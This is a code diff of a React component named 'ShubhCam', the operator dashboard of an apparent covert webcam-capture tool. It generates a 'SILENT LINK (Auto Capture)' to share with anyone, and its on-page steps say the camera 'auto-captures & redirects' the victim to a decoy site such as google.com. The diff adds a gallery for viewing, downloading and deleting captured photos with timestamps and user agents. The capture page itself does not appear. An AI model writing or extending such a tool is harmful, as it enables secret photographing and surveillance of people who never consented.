@@ -1,17 +1,40 @@
-import { useState } from "react";
-import { Camera, Link2, Image, Copy, Settings, RefreshCw, Zap } from "lucide-react";
+import { useState, useEffect } from "react";
+import { Camera, Link2, Image, Copy, Settings, RefreshCw, Zap, Trash2, Download, ExternalLink } from "lucide-react";
 import { Button } from "./ui/button";
 import { Input } from "./ui/input";
 import { toast } from "@/hooks/use-toast";
 import { cn } from "@/lib/utils";
 
+interface CapturedPhoto {
+  id: number;
+  image: string;
+  timestamp: string;
+  userAgent: string;
+}
+
 const ShubhCam = () => {
   const [activeTab, setActiveTab] = useState<"link" | "photos">("link");
   const [redirectUrl, setRedirectUrl] = useState("https://google.com");
-  const [photos, setPhotos] = useState<string[]>([]);
-  const [sessionId] = useState(() => Math.random().toString(36).substring(2, 12));
+  const [photos, setPhotos] = useState<CapturedPhoto[]>([]);
+  const [sessionId, setSessionId] = useState(() => Math.random().toString(36).substring(2, 10));
 
-  const captureLink = `https://darkshubh8.vercel.app/s?session=${sessionId}&redirect=${encodeURIComponent(redirectUrl)}`;
+  // Get current domain for link generation
+  const currentOrigin = typeof window !== 'undefined' ? window.location.origin : '';
+  const captureLink = `${currentOrigin}/capture?session=${sessionId}&redirect=${encodeURIComponent(redirectUrl)}`;
+
+  // Load photos from localStorage
+  const loadPhotos = () => {
+    const storedPhotos = localStorage.getItem(`shubhcam_${sessionId}`);
+    if (storedPhotos) {
+      setPhotos(JSON.parse(storedPhotos));
+    } else {
+      setPhotos([]);
+    }
+  };
+
+  useEffect(() => {
+    loadPhotos();
+  }, [sessionId]);
 
   const copyToClipboard = (text: string) => {
     navigator.clipboard.writeText(text);
@@ -21,24 +44,47 @@ const ShubhCam = () => {
     });
   };
 
-  const generateIframeLink = () => {
-    toast({
-      title: "IFrame Link Generated",
-      description: "Your capture link with iframe is ready",
-    });
-  };
-
-  const newSession = () => {
+  const generateNewSession = () => {
+    const newSessionId = Math.random().toString(36).substring(2, 10);
+    setSessionId(newSessionId);
+    setPhotos([]);
     toast({
       title: "New Session Created",
-      description: "A fresh session has been initialized",
+      description: `Session ID: ${newSessionId}`,
     });
   };
 
   const refreshPhotos = () => {
+    loadPhotos();
     toast({
-      title: "Refreshing Photos",
-      description: "Checking for new captures...",
+      title: "Refreshed",
+      description: `Found ${photos.length} captured photos`,
+    });
+  };
+
+  const deletePhoto = (photoId: number) => {
+    const updatedPhotos = photos.filter(p => p.id !== photoId);
+    setPhotos(updatedPhotos);
+    localStorage.setItem(`shubhcam_${sessionId}`, JSON.stringify(updatedPhotos));
+    toast({
+      title: "Deleted",
+      description: "Photo removed",
+    });
+  };
+
+  const downloadPhoto = (photo: CapturedPhoto) => {
+    const link = document.createElement('a');
+    link.href = photo.image;
+    link.download = `capture_${photo.id}.jpg`;
+    link.click();
+  };
+
+  const clearAllPhotos = () => {
+    setPhotos([]);
+    localStorage.removeItem(`shubhcam_${sessionId}`);
+    toast({
+      title: "Cleared",
+      description: "All photos deleted",
     });
   };
 
@@ -74,7 +120,7 @@ const ShubhCam = () => {
           <Zap className="w-4 h-4" /> LINK
         </button>
         <button
-          onClick={() => setActiveTab("photos")}
+          onClick={() => { setActiveTab("photos"); refreshPhotos(); }}
           className={cn(
             "flex-1 py-3 px-4 flex items-center justify-center gap-2 transition-all",
             activeTab === "photos"
@@ -94,8 +140,14 @@ const ShubhCam = () => {
             <ol className="text-sm text-muted-foreground space-y-1 list-decimal list-inside">
               <li>Copy the link below</li>
               <li>Share with anyone</li>
-              <li>When they click & capture, photo appears here!</li>
+              <li>When they click, camera auto-captures & redirects!</li>
             </ol>
+          </div>
+
+          {/* Session ID */}
+          <div className="flex items-center gap-2 text-xs">
+            <span className="text-muted-foreground">Session:</span>
+            <span className="text-neon-cyan font-mono">{sessionId}</span>
           </div>
 
           {/* Silent Link */}
@@ -103,19 +155,18 @@ const ShubhCam = () => {
             <div className="flex items-center gap-2 mb-2">
               <span className="text-neon-cyan">👁</span>
               <h3 className="text-neon-green font-bold">SILENT LINK (Auto Capture)</h3>
-              <Settings className="w-4 h-4 text-muted-foreground ml-auto cursor-pointer hover:text-foreground" />
             </div>
             <div className="flex gap-2">
               <Input
                 value={captureLink}
                 readOnly
-                className="bg-input border-neon-green/50 text-neon-green text-sm font-mono"
+                className="bg-input border-neon-green/50 text-neon-green text-xs font-mono"
               />
               <Button
                 variant="outline"
                 size="icon"
                 onClick={() => copyToClipboard(captureLink)}
-                className="border-neon-green text-neon-green hover:bg-neon-green/10"
+                className="border-neon-green text-neon-green hover:bg-neon-green/10 shrink-0"
               >
                 <Copy className="w-4 h-4" />
               </Button>
@@ -125,33 +176,36 @@ const ShubhCam = () => {
             </p>
           </div>
 
-          {/* IFrame Link Generator */}
+          {/* Redirect URL */}
           <div>
             <div className="flex items-center gap-2 mb-2">
-              <span className="text-neon-cyan">🖥</span>
-              <h3 className="text-neon-cyan font-bold">IFRAME LINK GENERATOR</h3>
+              <span className="text-neon-cyan">🔗</span>
+              <h3 className="text-neon-cyan font-bold">REDIRECT URL</h3>
             </div>
             <Input
               value={redirectUrl}
               onChange={(e) => setRedirectUrl(e.target.value)}
               placeholder="https://google.com"
-              className="bg-input border-neon-green/50 text-neon-green mb-3"
+              className="bg-input border-neon-green/50 text-neon-green"
             />
-            <Button
-              onClick={generateIframeLink}
-              className="w-full bg-neon-green text-background font-bold hover:bg-neon-green/90"
-            >
-              <Link2 className="w-4 h-4 mr-2" /> GENERATE IFRAME LINK
-            </Button>
             <p className="text-neon-purple text-xs mt-2">
-              💡 Kisi bhi URL ke saath capture link generate kareln - photo capture ke baad user us URL pe redirect hoga
+              💡 User capture ke baad is URL pe redirect hoga
             </p>
           </div>
+
+          {/* Test Link */}
+          <Button
+            onClick={() => window.open(captureLink, '_blank')}
+            variant="outline"
+            className="w-full border-neon-cyan text-neon-cyan hover:bg-neon-cyan/10"
+          >
+            <ExternalLink className="w-4 h-4 mr-2" /> TEST LINK
+          </Button>
 
           {/* Action Buttons */}
           <div className="space-y-3">
             <Button
-              onClick={newSession}
+              onClick={generateNewSession}
               variant="outline"
               className="w-full border-neon-green text-neon-green hover:bg-neon-green/10"
             >
@@ -166,20 +220,69 @@ const ShubhCam = () => {
           </div>
         </div>
       ) : (
-        <div className="min-h-[200px] flex items-center justify-center">
+        <div className="space-y-4">
           {photos.length === 0 ? (
-            <div className="text-center text-muted-foreground">
-              <Camera className="w-12 h-12 mx-auto mb-3 opacity-50" />
-              <p>No photos captured yet</p>
-              <p className="text-sm">Share your link to start capturing!</p>
+            <div className="min-h-[200px] flex items-center justify-center">
+              <div className="text-center text-muted-foreground">
+                <Camera className="w-12 h-12 mx-auto mb-3 opacity-50" />
+                <p>No photos captured yet</p>
+                <p className="text-sm">Share your link to start capturing!</p>
+              </div>
             </div>
           ) : (
-            <div className="grid grid-cols-2 gap-4">
-              {photos.map((photo, i) => (
-                <img key={i} src={photo} alt={`Capture ${i + 1}`} className="rounded-lg" />
-              ))}
-            </div>
+            <>
+              <div className="flex justify-between items-center">
+                <span className="text-sm text-muted-foreground">{photos.length} captures</span>
+                <Button
+                  variant="outline"
+                  size="sm"
+                  onClick={clearAllPhotos}
+                  className="border-neon-red text-neon-red hover:bg-neon-red/10"
+                >
+                  <Trash2 className="w-3 h-3 mr-1" /> Clear All
+                </Button>
+              </div>
+              <div className="grid grid-cols-2 gap-4">
+                {photos.map((photo) => (
+                  <div key={photo.id} className="relative group">
+                    <img 
+                      src={photo.image} 
+                      alt={`Capture ${photo.id}`} 
+                      className="rounded-lg border border-neon-green/30 w-full aspect-square object-cover"
+                    />
+                    <div className="absolute inset-0 bg-background/80 opacity-0 group-hover:opacity-100 transition-opacity rounded-lg flex items-center justify-center gap-2">
+                      <Button
+                        size="icon"
+                        variant="outline"
+                        onClick={() => downloadPhoto(photo)}
+                        className="border-neon-green text-neon-green"
+                      >
+                        <Download className="w-4 h-4" />
+                      </Button>
+                      <Button
+                        size="icon"
+                        variant="outline"
+                        onClick={() => deletePhoto(photo.id)}
+                        className="border-neon-red text-neon-red"
+                      >
+                        <Trash2 className="w-4 h-4" />
+                      </Button>
+                    </div>
+                    <p className="text-xs text-muted-foreground mt-1 truncate">
+                      {new Date(photo.timestamp).toLocaleString()}
+                    </p>
+                  </div>
+                ))}
+              </div>
+            </>
           )}
+          
+          <Button
+            onClick={refreshPhotos}
+            className="w-full bg-neon-pink text-background font-bold hover:bg-neon-pink/90"
+          >
+            <RefreshCw className="w-4 h-4 mr-2" /> REFRESH PHOTOS
+          </Button>
         </div>
       )}
     </div>
